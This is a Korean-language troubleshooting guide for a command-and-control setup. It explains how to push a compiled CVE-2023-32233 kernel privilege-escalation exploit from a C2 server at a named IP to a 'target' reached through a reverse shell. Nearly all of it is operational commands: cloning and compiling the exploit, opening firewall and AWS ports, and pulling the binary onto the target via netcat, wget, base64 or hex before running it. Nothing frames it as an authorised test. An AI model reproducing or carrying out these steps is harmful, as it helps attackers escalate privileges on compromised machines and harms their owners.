# C2 서버 설정 문제 해결

## 문제
타겟에서 `wget http://13.158.67.78:5000` → Connection refused

---

## 원인 체크

### 1. HTTP 서버가 실행 중인지 확인

**C2 서버에서:**

```bash
# 실행 중인 HTTP 서버 확인
ps aux | grep "http.server"
netstat -tulnp | grep 5000
ss -tulnp | grep 5000
```

**실행 안되어 있으면:**

```bash
cd /tmp
python3 -m http.server 5000 &
```

또는:

```bash
cd /tmp
nohup python3 -m http.server 5000 > /dev/null 2>&1 &
```

---

### 2. 방화벽 확인

**C2 서버에서:**

```bash
# Ubuntu 방화벽 (ufw) 확인
sudo ufw status

# 5000 포트 열기
sudo ufw allow 5000/tcp

# iptables 확인
sudo iptables -L -n | grep 5000
```

---

### 3. AWS 보안 그룹 확인

C2 서버 (13.158.67.78)의 AWS 보안 그룹에서:

**인바운드 규칙에 추가:**
- Type: Custom TCP
- Port: 5000
- Source: 0.0.0.0/0 (또는 타겟 IP: 3.34.181.145/32)

**또는 타겟 IP만 허용:**
- Type: Custom TCP
- Port: 5000
- Source: 3.34.181.145/32

---

### 4. 타겟에서 연결 테스트

**타겟 리버스 쉘에서:**

```bash
# C2 서버 연결 확인 (4444 포트 - 리버스 쉘 포트)
nc -zv 13.158.67.78 4444

# 5000 포트 확인
nc -zv 13.158.67.78 5000
timeout 5 bash -c "</dev/tcp/13.158.67.78/5000" && echo "Connected" || echo "Failed"

# curl로 테스트
curl -I http://13.158.67.78:5000/
```

---

## 해결 방법

### 방법 1: 리버스 쉘 포트로 파일 전송 (네트캣)

**C2 서버에서 (새 터미널):**

```bash
cd /tmp/CVE-2023-32233
nc -lvnp 5001 < exploit
```

**타겟에서:**

```bash
cd /tmp
nc 13.158.67.78 5001 > exploit
chmod +x exploit
./exploit
```

---

### 방법 2: Base64 인코딩으로 전송

**C2 서버에서:**

```bash
cd /tmp/CVE-2023-32233
base64 exploit > exploit.b64
cat exploit.b64
```

**출력된 base64 문자열을 복사**

**타겟에서:**

```bash
cd /tmp
cat > exploit.b64 << 'B64EOF'
[여기에 base64 문자열 붙여넣기]
B64EOF

base64 -d exploit.b64 > exploit
chmod +x exploit
./exploit
```

---

### 방법 3: Python을 통한 전송

**C2 서버에서:**

```bash
cd /tmp/CVE-2023-32233

python3 << 'PYEOF'
with open('exploit', 'rb') as f:
    data = f.read()
    print(data.hex())
PYEOF
```

**타겟에서:**

```bash
python3 << 'PYEOF'
import binascii
hex_data = "[C2에서 출력된 hex 문자열]"
with open('/tmp/exploit', 'wb') as f:
    f.write(binascii.unhexlify(hex_data))
PYEOF

chmod +x /tmp/exploit
./exploit
```

---

### 방법 4: 리버스 쉘을 통한 직접 전송

**현재 리버스 쉘 세션에서:**

타겟 쉘에서 파일을 받을 준비:

```bash
cd /tmp
cat > exploit << 'BINEOF'
```

**C2 서버 (리스너가 있는 터미널)에서:**

```bash
cat /tmp/CVE-2023-32233/exploit
```

**문제:** 바이너리 파일이라 이 방법은 안됨

---

### 방법 5: 0.0.0.0으로 바인딩 (가장 확실)

**C2 서버에서:**

```bash
cd /tmp

# 모든 인터페이스에서 수신
python3 -c "
import http.server
import socketserver

PORT = 5000
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(('0.0.0.0', PORT), Handler) as httpd:
    print(f'Serving on port {PORT}')
    httpd.serve_forever()
"
```

또는:

```bash
cd /tmp
python3 -m http.server 5000 --bind 0.0.0.0 &
```

---

### 방법 6: 다른 포트 사용

**C2 서버에서:**

```bash
cd /tmp
python3 -m http.server 80 &
# 또는
python3 -m http.server 8080 &
```

**타겟에서:**

```bash
wget http://13.158.67.78:80/CVE-2023-32233/exploit
# 또는
wget http://13.158.67.78:8080/CVE-2023-32233/exploit
```

---

## 🚀 지금 바로 실행 (추천)

### C2 서버:

```bash
# 1. CVE-2023-32233 다운로드 및 컴파일
cd /tmp
GIT_TERMINAL_PROMPT=0 git clone https://github.com/Liuk3r/CVE-2023-32233.git
cd CVE-2023-32233
gcc -o exploit exploit.c -lmnl -lnftnl -lpthread

# 2. 네트캣으로 전송 (포트 5001)
nc -lvnp 5001 < exploit
```

### 타겟:

```bash
cd /tmp
nc 13.158.67.78 5001 > exploit
chmod +x exploit
ls -la exploit
file exploit
./exploit
```

---

## 대안: exploit을 타겟에서 직접 컴파일

**타겟에서 gcc 확인:**

```bash
which gcc
gcc --version
```

**있으면:**

**C2 서버에서 exploit.c를 base64로:**

```bash
cd /tmp/CVE-2023-32233
base64 exploit.c
```

**타겟에서:**

```bash
cd /tmp
cat > exploit.c << 'CODEEOF'
[exploit.c 내용 붙여넣기]
CODEEOF

gcc -o exploit exploit.c -lmnl -lnftnl -lpthread
./exploit
```

**gcc 없으면 안됨**

---

## 확인할 것들 (순서대로)

### C2 서버:

```bash
# 1. HTTP 서버 실행 중?
ps aux | grep http

# 2. 포트 5000 열림?
netstat -tulnp | grep 5000

# 3. exploit 파일 존재?
ls -la /tmp/CVE-2023-32233/exploit

# 4. 방화벽 확인
sudo ufw status
```

### 타겟:

```bash
# C2 서버 연결 가능?
ping -c 3 13.158.67.78
nc -zv 13.158.67.78 5000
curl -I http://13.158.67.78:5000/
```

---

## 가장 확실한 방법: nc 전송

**C2 (터미널 1):**

```bash
cd /tmp/CVE-2023-32233
nc -lvnp 5001 < exploit
```

**타겟:**

```bash
cd /tmp
nc 13.158.67.78 5001 > exploit
chmod +x exploit
./exploit
```

**이 방법은 HTTP 서버나 보안그룹 설정 필요 없음!**
